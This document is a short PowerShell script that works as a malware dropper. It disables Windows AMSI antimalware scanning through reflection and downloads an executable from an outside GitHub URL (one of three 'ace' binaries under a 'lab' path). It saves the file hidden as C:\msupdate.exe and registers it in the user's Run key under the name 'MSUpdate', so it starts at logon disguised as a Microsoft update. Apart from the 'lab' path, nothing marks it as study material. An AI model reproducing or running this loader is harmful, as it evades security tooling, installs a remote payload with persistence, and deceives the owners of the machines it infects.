$ErrorActionPreference='SilentlyContinue'
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# === CHANGE THIS ===
$version = 0   # Change to 0, 1 or 2

switch($version){
    0 {$url='https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe'}
    1 {$url='https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace1.exe'}
    2 {$url='https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace2.exe'}
    default {$url='https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe'}
}

$path = 'C:\msupdate.exe'

try {
    (New-Object Net.WebClient).DownloadFile($url, $path)
    attrib +h $path 2>$null
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MSUpdate' -Value $path -Type String -Force
} catch {}

exit
